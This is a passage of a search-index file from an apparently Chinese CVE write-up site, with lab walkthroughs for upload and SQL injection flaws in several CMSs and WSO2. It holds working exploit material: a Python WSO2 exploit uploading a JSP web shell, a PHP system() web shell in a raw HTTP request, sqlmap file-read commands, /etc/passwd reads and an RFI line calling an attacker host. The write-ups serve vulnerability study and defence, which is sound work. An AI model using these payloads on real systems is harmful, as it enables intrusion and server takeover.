\u70b9\u51fb\u4e3b\u9898\u7ba1\u7406\uff0c\u70b9\u51fb\u4e0a\u4f20\u4e3b\u9898\uff0c\u5982\u4e0b\u56fe\uff1a 3. \u5236\u4f5c\u4e00\u53e5\u8bdd\u6728\u9a6c shell.php, \u5e76\u5c06\u76ee\u5f55\u538b\u7f29\u4e3a shell.tar.gz \u683c\u5f0f\uff0c\u5982\u4e0b\u56fe\uff1a 4. \u4e0a\u4f20 shell.tar.gz \u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a 5. \u4e0a\u4f20\u6210\u529f\u540e\uff0c\u4e3b\u9898\u6587\u4ef6\u5b58\u653e\u5728 /data/themes/ \u76ee\u5f55\u4e0b\uff0c\u5982\u4e0b\u56fe\uff1a 6. \u8bbf\u95ee shell.php\uff0c\u6267\u884c\u547d\u4ee4\u83b7\u53d6flag\uff0c\u5982\u4e0b\u56fe\uff1a 7. \u8bbf\u95ee shell.php\uff0c\u6267\u884c\u547d\u4ee4\u67e5\u770b /etc/passwd \u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-26965/#mitigation","text":"\u8be5\u6f0f\u6d1e\u662f\u901a\u8fc7\u4e0a\u4f20\u4e3b\u9898\u6587\u4ef6\u6765\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d\u6765\u8fdb\u884c\u9632\u5fa1\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-26965/#refer","text":"https://nvd.nist.gov/vuln/detail/CVE-2022-26965 https://packetstormsecurity.com/files/166336/Pluck-CMS-4.7.16-Shell-Upload.html https://github.com/pluck-cms/themes","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-28060/","text":"CVE-2022-28060 \u00b6 Description \u00b6 Victor CMS v1.0 \u4e2d\u7684 /includes/login.php \u9875\u9762 user_name \u53c2\u6570\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e Explanation of exploit; PoC \u00b6 \u5728\u9996\u9875\u70b9\u51fb\u767b\u5f55\uff0c\u7136\u540e\u901a\u8fc7 BurpSuite \u62e6\u622a\u8bf7\u6c42\uff0c\u5e76\u5c06\u8bf7\u6c42\u4fdd\u5b58\u4e3a\u6587\u4ef6 user_name.txt\uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528 sqlmap \u5bf9 user_name.txt \u8fdb\u884c\u6ce8\u5165 sqlmap -r .\\user_name.txt --batch --file-read '/flag' --dbms mysql \uff0c\uff08\u4f7f\u7528\u65f6\u95f4\u76f2\u6ce8\uff0c\u9700\u8981\u51e0\u5206\u949f\u65f6\u95f4\uff09\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u8be5\u6f0f\u6d1e\u4f7f\u7528\u65f6\u95f4\u76f2\u6ce8\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u6ce8\u5165\u548c\u8bbf\u95ee\uff0c\u6cc4\u9732\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u6570\u636e\u3002\u5efa\u8bae\uff1a 1. \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 2. \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 3. \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002 Refer \u00b6 https://github.com/JiuBanSec/CVE/blob/main/VictorCMS%20SQL.md https://yunjing.ichunqiu.com/cve/detail/1027 https://nvd.nist.gov/vuln/detail/CVE-2022-28060","title":"CVE-2022-28060"},{"location":"cves/CVE-2022/CVE-2022-28060/#cve-2022-28060","text":"","title":"CVE-2022-28060"},{"location":"cves/CVE-2022/CVE-2022-28060/#description","text":"Victor CMS v1.0 \u4e2d\u7684 /includes/login.php \u9875\u9762 user_name \u53c2\u6570\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-28060/#explanation-of-exploit-poc","text":"\u5728\u9996\u9875\u70b9\u51fb\u767b\u5f55\uff0c\u7136\u540e\u901a\u8fc7 BurpSuite \u62e6\u622a\u8bf7\u6c42\uff0c\u5e76\u5c06\u8bf7\u6c42\u4fdd\u5b58\u4e3a\u6587\u4ef6 user_name.txt\uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528 sqlmap \u5bf9 user_name.txt \u8fdb\u884c\u6ce8\u5165 sqlmap -r .\\user_name.txt --batch --file-read '/flag' --dbms mysql \uff0c\uff08\u4f7f\u7528\u65f6\u95f4\u76f2\u6ce8\uff0c\u9700\u8981\u51e0\u5206\u949f\u65f6\u95f4\uff09\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-28060/#mitigation","text":"\u8be5\u6f0f\u6d1e\u4f7f\u7528\u65f6\u95f4\u76f2\u6ce8\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u6ce8\u5165\u548c\u8bbf\u95ee\uff0c\u6cc4\u9732\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u6570\u636e\u3002\u5efa\u8bae\uff1a 1. \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 2. \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 3. \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-28060/#refer","text":"https://github.com/JiuBanSec/CVE/blob/main/VictorCMS%20SQL.md https://yunjing.ichunqiu.com/cve/detail/1027 https://nvd.nist.gov/vuln/detail/CVE-2022-28060","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-28512/","text":"CVE-2022-28512 \u00b6 Description \u00b6 Fantastic Blog (CMS)\u662f\u4e00\u4e2a\u7edd\u5bf9\u51fa\u8272\u7684\u535a\u5ba2/\u6587\u7ae0\u7f51\u7edc\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\u3002 \u5b83\u4f7f\u60a8\u53ef\u4ee5\u8f7b\u677e\u5730\u7ba1\u7406\u60a8\u7684\u7f51\u7ad9\u6216\u535a\u5ba2\uff0c\u5b83\u4e3a\u60a8\u63d0\u4f9b\u4e86\u5e7f\u6cdb\u7684\u529f\u80fd\u6765\u5b9a\u5236\u60a8\u7684\u535a\u5ba2\u4ee5\u6ee1\u8db3\u60a8\u7684\u9700\u6c42\u3002 \u5b83\u5177\u6709\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u60a8\u65e0\u9700\u63a5\u89e6\u4efb\u4f55\u4ee3\u7801\u5373\u53ef\u542f\u52a8\u5e76\u8fd0\u884c\u60a8\u7684\u535a\u5ba2\u3002 \u8be5CMS\u7684/single.php\u8def\u5f84\u4e0b\uff0cid\u53c2\u6570\u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002 Explanation of exploit; PoC \u00b6 \u901a\u8fc7 Description \u53ef\u77e5\uff0c\u8be5CMS\u7684/single.php\u8def\u5f84\u4e0b\uff0cid\u53c2\u6570\u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u4f7f\u7528 Sqlmap \u5bf9\u6ce8\u5165\u70b9\u8fdb\u884c\u6ce8\u5165\uff0c\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u3002 \u4f7f\u7528 Sqlmap \u83b7\u53d6\u6570\u636e\u5e93\u8868\u4fe1\u606f\u3002 \u4f7f\u7528 Sqlmap \u83b7\u53d6\u6570\u636e\u5e93\u8868\u5b57\u6bb5\u4fe1\u606f\u3002 \u83b7\u53d6flag\u3002 \u83b7\u53d6 os-shell\u3002 Mitigation \u00b6 \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002 Refer \u00b6 https://yunjing.ichunqiu.com/cve/detail/749 https://nvd.nist.gov/vuln/detail/CVE-2022-28512","title":"CVE-2022-28512"},{"location":"cves/CVE-2022/CVE-2022-28512/#cve-2022-28512","text":"","title":"CVE-2022-28512"},{"location":"cves/CVE-2022/CVE-2022-28512/#description","text":"Fantastic Blog (CMS)\u662f\u4e00\u4e2a\u7edd\u5bf9\u51fa\u8272\u7684\u535a\u5ba2/\u6587\u7ae0\u7f51\u7edc\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\u3002 \u5b83\u4f7f\u60a8\u53ef\u4ee5\u8f7b\u677e\u5730\u7ba1\u7406\u60a8\u7684\u7f51\u7ad9\u6216\u535a\u5ba2\uff0c\u5b83\u4e3a\u60a8\u63d0\u4f9b\u4e86\u5e7f\u6cdb\u7684\u529f\u80fd\u6765\u5b9a\u5236\u60a8\u7684\u535a\u5ba2\u4ee5\u6ee1\u8db3\u60a8\u7684\u9700\u6c42\u3002 \u5b83\u5177\u6709\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u60a8\u65e0\u9700\u63a5\u89e6\u4efb\u4f55\u4ee3\u7801\u5373\u53ef\u542f\u52a8\u5e76\u8fd0\u884c\u60a8\u7684\u535a\u5ba2\u3002 \u8be5CMS\u7684/single.php\u8def\u5f84\u4e0b\uff0cid\u53c2\u6570\u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-28512/#explanation-of-exploit-poc","text":"\u901a\u8fc7 Description \u53ef\u77e5\uff0c\u8be5CMS\u7684/single.php\u8def\u5f84\u4e0b\uff0cid\u53c2\u6570\u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u4f7f\u7528 Sqlmap \u5bf9\u6ce8\u5165\u70b9\u8fdb\u884c\u6ce8\u5165\uff0c\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u3002 \u4f7f\u7528 Sqlmap \u83b7\u53d6\u6570\u636e\u5e93\u8868\u4fe1\u606f\u3002 \u4f7f\u7528 Sqlmap \u83b7\u53d6\u6570\u636e\u5e93\u8868\u5b57\u6bb5\u4fe1\u606f\u3002 \u83b7\u53d6flag\u3002 \u83b7\u53d6 os-shell\u3002","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-28512/#mitigation","text":"\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-28512/#refer","text":"https://yunjing.ichunqiu.com/cve/detail/749 https://nvd.nist.gov/vuln/detail/CVE-2022-28512","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-28525/","text":"CVE-2022-28525 \u00b6 Description \u00b6 ED01-CMS v20180505 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u6076\u610f\u6587\u4ef6\uff0c\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 \u6f0f\u6d1e\u70b9\u4f4d\u4e8e\u4fee\u6539\u7528\u6237\u4fe1\u606f\u9875\u9762\u7684\u56fe\u7247\u4e0a\u4f20\u529f\u80fd\uff0c\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 Explanation of exploit; PoC \u00b6 \u9996\u5148\u4f7f\u7528 admin/admin \u767b\u5f55\u540e\u53f0\uff0c\u70b9\u51fb\u7528\u6237\u7ba1\u7406\uff0c\u70b9\u51fb\u4fee\u6539\u7528\u6237\u4fe1\u606f\uff0c\u5982\u4e0b\u56fe\uff1a 2. \u70b9\u51fb\u4fee\u6539\u5934\u50cf\uff0c\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\uff0c\u6b64\u5904\u4e0a\u4f20webshell\uff0c\u5982\u4e0b\u56fe\uff1a 3. \u4e0a\u4f20\u7684webshell\u6587\u4ef6\u8def\u5f84\u4e3a\uff1a/images \u76ee\u5f55\u4e0b\uff0c\u5982\u4e0b\u56fe\uff1a 4. \u4e0a\u4f20\u6210\u529f\u540e\uff0c\u8bbf\u95eewebshell\uff0c\u5982\u4e0b\u56fe\uff1a 5. \u83b7\u53d6shell\u6210\u529f\uff0c\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u8def\u5f84 \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u6743\u9650 Refer \u00b6 https://nvd.nist.gov/vuln/detail/CVE-2022-28525 https://yunjing.ichunqiu.com/cve/detail/1017","title":"CVE-2022-28525"},{"location":"cves/CVE-2022/CVE-2022-28525/#cve-2022-28525","text":"","title":"CVE-2022-28525"},{"location":"cves/CVE-2022/CVE-2022-28525/#description","text":"ED01-CMS v20180505 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020\u6076\u610f\u6587\u4ef6\uff0c\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 \u6f0f\u6d1e\u70b9\u4f4d\u4e8e\u4fee\u6539\u7528\u6237\u4fe1\u606f\u9875\u9762\u7684\u56fe\u7247\u4e0a\u4f20\u529f\u80fd\uff0c\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-28525/#explanation-of-exploit-poc","text":"\u9996\u5148\u4f7f\u7528 admin/admin \u767b\u5f55\u540e\u53f0\uff0c\u70b9\u51fb\u7528\u6237\u7ba1\u7406\uff0c\u70b9\u51fb\u4fee\u6539\u7528\u6237\u4fe1\u606f\uff0c\u5982\u4e0b\u56fe\uff1a 2. \u70b9\u51fb\u4fee\u6539\u5934\u50cf\uff0c\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\uff0c\u6b64\u5904\u4e0a\u4f20webshell\uff0c\u5982\u4e0b\u56fe\uff1a 3. \u4e0a\u4f20\u7684webshell\u6587\u4ef6\u8def\u5f84\u4e3a\uff1a/images \u76ee\u5f55\u4e0b\uff0c\u5982\u4e0b\u56fe\uff1a 4. \u4e0a\u4f20\u6210\u529f\u540e\uff0c\u8bbf\u95eewebshell\uff0c\u5982\u4e0b\u56fe\uff1a 5. \u83b7\u53d6shell\u6210\u529f\uff0c\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-28525/#mitigation","text":"\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u8def\u5f84 \u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u6743\u9650","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-28525/#refer","text":"https://nvd.nist.gov/vuln/detail/CVE-2022-28525 https://yunjing.ichunqiu.com/cve/detail/1017","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-29464/","text":"CVE-2022-29464 \u00b6 Description \u00b6 WSO2\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(CVE-2022-29464)\u662f Orange Tsai \u53d1\u73b0\u7684 WSO2 \u4e0a\u7684\u4e25\u91cd\u6f0f\u6d1e\u3002 \u8be5\u6f0f\u6d1e\u662f\u4e00\u79cd\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u65e0\u9650\u5236\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u6076\u610f JSP \u6587\u4ef6\u5728 WSO2 \u670d\u52a1\u5668\u4e0a\u83b7\u5f97 RCE\u3002 Explanation of exploit \u00b6 \u5177\u4f53\u5206\u6790\u770b\u8fd9\u91cc https://github.com/hakivvi/CVE-2022-29464 \u8fd9\u91cc\u4f7f\u7528\u6625\u79cb\u4e91\u955c\u9776\u6807\u6f14\u793a\uff0c\u6625\u79cb\u4e91\u955c\u9776\u6807\u5730\u5740\uff1ahttps://yunjing.ichunqiu.com/cve/detail/734 \u8fd0\u884c PoC \u811a\u672c\uff0c\u4e0a\u4f20 JSP \u6587\u4ef6\uff0c\u6210\u529f\u83b7\u53d6 RCE; PoC \u811a\u672c\u65b9\u6cd5\u4e3a\uff1a python3 exploit.py https://host:9443/ ArbitraryShellName.jsp \u5c06host\u66ff\u6362\u4e3a\u76ee\u6807\uff0c\u5982 python .\\main.py https://eci-2zee9fyka677nqjaa6he.cloudeci1.ichunqiu.com:9443 shell.jsp \u6253\u5f00\u6d4f\u89c8\u5668\u8bbf\u95ee\u76ee\u6807\uff0c\u6210\u529f\u83b7\u53d6 RCE https://eci-2zee9fyka677nqjaa6he.cloudeci1.ichunqiu.com:9443/authenticationendpoint/shell.jsp?cmd=cat+%2Fflag \u83b7\u53d6 flag PoC \u00b6 ## exploit.py import requests , urllib3 , sys urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) if len ( sys . argv ) != 3 : print ( f \"Usage: python3 { sys . argv [ 0 ] } https://host shell.jsp\" ) exit () host , file = sys . argv [ 1 :] shell = \"\"\"<FORM> <INPUT name='cmd' type=text> <INPUT type=submit value='Run'> </FORM> <%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"</br>\"; } } catch(IOException e) { e.printStackTrace(); } } %> <pre><%=output %></pre>\"\"\" files = { f \"../../../../repository/deployment/server/webapps/authenticationendpoint/ { file } \" : shell } response = requests . post ( f ' { host } /fileupload/toolsAny' , files = files , verify = False ) print ( f \"shell @ { host } /authenticationendpoint/ { file } \" ) Mitigation \u00b6 https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738 Refer \u00b6 https://github.com/hakivvi/CVE-2022-29464 https://yunjing.ichunqiu.com/cve/detail/734","title":"CVE-2022-29464"},{"location":"cves/CVE-2022/CVE-2022-29464/#cve-2022-29464","text":"","title":"CVE-2022-29464"},{"location":"cves/CVE-2022/CVE-2022-29464/#description","text":"WSO2\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(CVE-2022-29464)\u662f Orange Tsai \u53d1\u73b0\u7684 WSO2 \u4e0a\u7684\u4e25\u91cd\u6f0f\u6d1e\u3002 \u8be5\u6f0f\u6d1e\u662f\u4e00\u79cd\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u65e0\u9650\u5236\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u6076\u610f JSP \u6587\u4ef6\u5728 WSO2 \u670d\u52a1\u5668\u4e0a\u83b7\u5f97 RCE\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-29464/#explanation-of-exploit","text":"\u5177\u4f53\u5206\u6790\u770b\u8fd9\u91cc https://github.com/hakivvi/CVE-2022-29464 \u8fd9\u91cc\u4f7f\u7528\u6625\u79cb\u4e91\u955c\u9776\u6807\u6f14\u793a\uff0c\u6625\u79cb\u4e91\u955c\u9776\u6807\u5730\u5740\uff1ahttps://yunjing.ichunqiu.com/cve/detail/734 \u8fd0\u884c PoC \u811a\u672c\uff0c\u4e0a\u4f20 JSP \u6587\u4ef6\uff0c\u6210\u529f\u83b7\u53d6 RCE; PoC \u811a\u672c\u65b9\u6cd5\u4e3a\uff1a python3 exploit.py https://host:9443/ ArbitraryShellName.jsp \u5c06host\u66ff\u6362\u4e3a\u76ee\u6807\uff0c\u5982 python .\\main.py https://eci-2zee9fyka677nqjaa6he.cloudeci1.ichunqiu.com:9443 shell.jsp \u6253\u5f00\u6d4f\u89c8\u5668\u8bbf\u95ee\u76ee\u6807\uff0c\u6210\u529f\u83b7\u53d6 RCE https://eci-2zee9fyka677nqjaa6he.cloudeci1.ichunqiu.com:9443/authenticationendpoint/shell.jsp?cmd=cat+%2Fflag \u83b7\u53d6 flag","title":"Explanation of exploit"},{"location":"cves/CVE-2022/CVE-2022-29464/#poc","text":"## exploit.py import requests , urllib3 , sys urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) if len ( sys . argv ) != 3 : print ( f \"Usage: python3 { sys . argv [ 0 ] } https://host shell.jsp\" ) exit () host , file = sys . argv [ 1 :] shell = \"\"\"<FORM> <INPUT name='cmd' type=text> <INPUT type=submit value='Run'> </FORM> <%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"</br>\"; } } catch(IOException e) { e.printStackTrace(); } } %> <pre><%=output %></pre>\"\"\" files = { f \"../../../../repository/deployment/server/webapps/authenticationendpoint/ { file } \" : shell } response = requests . post ( f ' { host } /fileupload/toolsAny' , files = files , verify = False ) print ( f \"shell @ { host } /authenticationendpoint/ { file } \" )","title":"PoC"},{"location":"cves/CVE-2022/CVE-2022-29464/#mitigation","text":"https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-29464/#refer","text":"https://github.com/hakivvi/CVE-2022-29464 https://yunjing.ichunqiu.com/cve/detail/734","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-30887/","text":"CVE-2022-30887 \u00b6 Description \u00b6 \u591a\u8bed\u8a00\u836f\u623f\u7ba1\u7406\u7cfb\u7edf (MPMS) \u662f\u7528 PHP \u548c MySQL \u5f00\u53d1\u7684, \u8be5\u8f6f\u4ef6\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5728\u836f\u623f\u548c\u5ba2\u6237\u4e4b\u95f4\u63d0\u4f9b\u4e00\u5957\u63a5\u53e3\uff0c\u5ba2\u6237\u662f\u8be5\u8f6f\u4ef6\u7684\u4e3b\u8981\u7528\u6237\u3002 \u8be5\u8f6f\u4ef6\u6709\u52a9\u4e8e\u4e3a\u836f\u623f\u4e1a\u52a1\u521b\u5efa\u4e00\u4e2a\u7efc\u5408\u6570\u636e\u5e93\uff0c\u5e76\u6839\u636e\u5230\u671f\u3001\u4ea7\u54c1\u7b49\u5404\u79cd\u53c2\u6570\u63d0\u4f9b\u5404\u79cd\u62a5\u544a\u3002 \u8be5 CMS(Pharmacy Management System v1.0) \u4e2d\u7684 php_action/editProductImage.php \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(File Inclusion Attack)\uff0c\u8fdb\u800c\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c(RCE)\u3002 What is a File Inclusion Attack \u00b6 File Upload vulnerabilities are usually a vulnerability that allows a script to run. It works when we upload the file to the server and enter a command on the uploaded file. File upload vulnerabilities are divided into two types; LFI (Local File Inclusion) RFI (Remote File Inclusion) LFI (Local File Inclusion) \u00b6 This vulnerability occurs when the local files on the server include the file retrieved from the user. values received from the user must be sterilized. Example of LFI (Local File Inclusion) ; <?php if($_REQUEST['s']) { system($_REQUEST['s']); } else phpinfo();?> RFI (Remote File Inclusion) \u00b6 This vulnerability works when the attacker upload malware from a remote server. Example of RFI (Remote File Inclusion) ; www.victim_site.com/abc.php?test=http://www.attacker_site.com/attack_page Explanation of exploit \u00b6 \u8fd9\u91cc\u4f7f\u7528\u6625\u79cb\u4e91\u955c\u7684\u9776\u573a https://yunjing.ichunqiu.com/cve/detail/748 \u6253\u5f00\u7ad9\u70b9\u5e76\u7528 Burp Suite \u6355\u83b7\u8bf7\u6c42\uff0c\u5e76\u5c06\u8bf7\u6c42 Send to Repeater \u5728 Repeater \u4e2d\u5199\u5165\u5982\u4e0b PoC \uff08\u6ce8\u610f\u4fee\u6539Host\uff09\u53d1\u9001\u540e\u67e5\u770b Response \u6709 Sucess \u5b57\u6837\u5219\u4e3a\u4e0a\u6b21\u6210\u529f\uff0c \u6587\u4ef6\u88ab\u4e0a\u4f20\u5230 /assets/myimages/ \u76ee\u5f55\u4e0b \u4e0a\u4f20 shell.php \u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u5373\u53ef\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff0c\u5982\u83b7\u53d6 flag \u4e3a http://eci-2ze1l9hzv0tz04yrt7rl.cloudeci1.ichunqiu.com/assets/myimages/shell.php?s=cat%20/flag \u6267\u884c\u5176\u4ed6\u547d\u4ee4\u5982 cat /etc/passwd PoC \u00b6 POST /php_action/editProductImage.php?id=1 HTTP/1.1 Host: eci-2zegbcou4c05rxuhfujv.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------208935235035266125502673738631 Content-Length: 556 Connection: close Cookie: PHPSESSID=t1jo541l52f76t9upiu0pbqv0c Upgrade-Insecure-Requests: 1 -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"old_image\" -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"productImage\"; filename=\"shell.php\" Content-Type: image/jpeg <?php if($_REQUEST['s']) { system($_REQUEST['s']); } else phpinfo(); ?> </pre> </body> </html> -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"btn\" -----------------------------208935235035266125502673738631-- Mitigation \u00b6 ensure you only accept characters such as a-Z0-9 and do not allow .. or / or %00 (null byte) Be ensure allow_url_include flag must be off acording to owasp 10 Remediation; \"Application can maintain a *white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path\" Refer \u00b6 https://nvd.nist.gov/vuln/detail/CVE-2022-30887 https://github.com/MuallimNaci/CVE-2022-30887","title":"CVE-2022-30887"},{"location":"cves/CVE-2022/CVE-2022-30887/#cve-2022-30887","text":"","title":"CVE-2022-30887"},{"location":"cves/CVE-2022/CVE-2022-30887/#description","text":"\u591a\u8bed\u8a00\u836f\u623f\u7ba1\u7406\u7cfb\u7edf (MPMS) \u662f\u7528 PHP \u548c MySQL \u5f00\u53d1\u7684, \u8be5\u8f6f\u4ef6\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5728\u836f\u623f\u548c\u5ba2\u6237\u4e4b\u95f4\u63d0\u4f9b\u4e00\u5957\u63a5\u53e3\uff0c\u5ba2\u6237\u662f\u8be5\u8f6f\u4ef6\u7684\u4e3b\u8981\u7528\u6237\u3002 \u8be5\u8f6f\u4ef6\u6709\u52a9\u4e8e\u4e3a\u836f\u623f\u4e1a\u52a1\u521b\u5efa\u4e00\u4e2a\u7efc\u5408\u6570\u636e\u5e93\uff0c\u5e76\u6839\u636e\u5230\u671f\u3001\u4ea7\u54c1\u7b49\u5404\u79cd\u53c2\u6570\u63d0\u4f9b\u5404\u79cd\u62a5\u544a\u3002 \u8be5 CMS(Pharmacy Management System v1.0) \u4e2d\u7684 php_action/editProductImage.php \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(File Inclusion Attack)\uff0c\u8fdb\u800c\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c(RCE)\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-30887/#what-is-a-file-inclusion-attack","text":"File Upload vulnerabilities are usually a vulnerability that allows a script to run. It works when we upload the file to the server and enter a command on the uploaded file. File upload vulnerabilities are divided into two types; LFI (Local File Inclusion) RFI (Remote File Inclusion)","title":"What is a File Inclusion Attack"},{"location":"cves/CVE-2022/CVE-2022-30887/#lfi-local-file-inclusion","text":"This vulnerability occurs when the local files on the server include the file retrieved from the user. values received from the user must be 